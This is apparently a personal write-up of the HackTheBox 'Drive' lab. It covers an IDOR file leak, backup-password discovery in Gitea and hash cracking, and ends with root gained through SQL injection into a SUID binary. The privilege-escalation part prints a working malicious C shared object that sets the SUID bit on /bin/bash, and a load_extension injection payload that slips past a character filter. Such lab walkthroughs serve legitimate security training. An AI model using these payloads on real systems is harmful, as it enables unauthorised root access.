# Overview

Drive is a hard HackTheBox machine featuring a file-sharing service vulnerable to IDOR, through which a plaintext password is obtained, leading to SSH access to the box. Encrypted database backups are discovered, which are unlocked using a hardcoded password exposed in a Gitea repository. Hashes within the backups are cracked, leading to access to another user on the system whom has access to a root-owned binary with the SUID bit set. The binary is reverse engineered and used to obtain a shell on the target.

```

From the nmap output we see that we have two open ports (22 & 80) and one filtered port (3000).

I checked the web page at port 80 :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231015135651.png>)

I created a user and logged in :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231015135939.png>)

There is a lot of options that we can do (upload a file, reserve/unreserve a file...)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017174334.png>)

First I checked the file that we have already there created by admin (Welcome_to_Doodle_Grive!) :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017174617.png>)

I noticed the id of the file, I said since the admin's post has an id of 100 maybe I can find other hidden files by fuzzing the file_id :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017180246.png>)

That was the case, I found 4 results that I am unauthorized to see with the getFileDetail method.

Then I uploaded a file and I see that I have more options that I can do :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017175503.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017175447.png>)

I tried the other methods available on my files on the other files that I found before, and the block method does the thing, I can now read the content of those files : 

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016120525.png>)

And by fuzzing now with **Intruder** using the new method, I see that the response code is 200 now :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016122426.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016122343.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016122506.png>)

I found the credentials of the user martin :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016122528.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016122544.png>)

I can also find the list of users by creating a group and editing it to add users :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017174505.png>)

Now I'm in as martin user :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016122807.png>)

# User flag

Following what we saw in the file with id 101 : "the database will be automatically compressed and copied to */var/www/backups/* ". I saw four 7z files and one SQLite database file :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016124526.png>)

I copied all those files to my locale machine, and I tried to crack them but it was a dead end.

After turning around the machine looking for some hidden hints or passwords, I found a sus running service at port 3000 :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016211336.png>)

So I did port forwarding to see what's there :

```bash
ssh -L 127.0.0.1:3000:127.0.0.1:3000 martin@10.129.48.20
```

I found that it's running a **Gitea** service, where I found the password of the 7z files :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016211944.png>)

I cracked all the 7z files and dumped all the user hashes. The dec 7z file contains pbkdf2 hashes which I couldn't crack. But other files contain sha1 hashes which I could successfully crack some of them !

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016211923.png>)

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016223336.png>)

```bash
hashcat.exe -a 0 -m 124 ../Desktop/hashes.txt rockyou.txt -O
```

I tried all the three password and only one of them worked, it was the one for the user tom :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016221447.png>)

Now I can read the user flag :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016221217.png>)

# PE

In tom's home directory, I found a binary file with SUID permissions :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016222628.png>)

The README.txt file contains a description about that binary :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017133502.png>)

When I tried to execute the binary, I was asked for some credentials which I don't have so I checked strings of the file, and I found them there :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016232806.png>)

Now I can login to the app. I checked all the choices but only the 5th choice looks interesting, where I can activate a user account by providing a username :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231016232637.png>)

While reverse engineering the binary I saw the query responsible for the activation of the user account :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017122534.png>)

So I said maybe I can inject some malicious input into the username and privesc. While I was looking for a way, I found that load_extension does the job.

>load_extension in SQLite is used to load a SQLite extension module into the current SQLite database connection. SQLite extensions are shared objects that provide additional functionality.

So I can just create malicious shared object and give it to the load_extension which will load it to our SQLite database.

[https://tbhaxor.com/exploiting-shared-library-misconfigurations](https://tbhaxor.com/exploiting-shared-library-misconfigurations)

I created a C script which will add a SUID bit to /bin/bash, and transferred it to the machine : 

```c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/usr/bin/chmod u+s /bin/bash");
}
```

And then I can use **gcc** to compile our C script :

```bash
gcc -shared -fPIC -nostartfiles -o p.so p.c
```

[https://stackoverflow.com/questions/6663124/how-to-load-extensions-into-sqlite](https://stackoverflow.com/questions/6663124/how-to-load-extensions-into-sqlite)

```bash
"+load_extension('./p')--"
```

In the first try that didn't work because as we can see there is a filtering on the '/' char :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017160835.png>)

So I thought about converting my string to ASCII code :

ASCII codes for the characters in the string './p' : 
- '.' : ASCII code 46
- '/' : ASCII code 47
- 'p' : ASCII code 112

```bash
"+load_extension(char(46,47,112))--"
```

And yes it WORKED!

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017160951.png>)

Now I'm ROOT, I can read the root flag :

![Alt text](<../../../assets/images/HTBPics/Pasted image 20231017161022.png>)
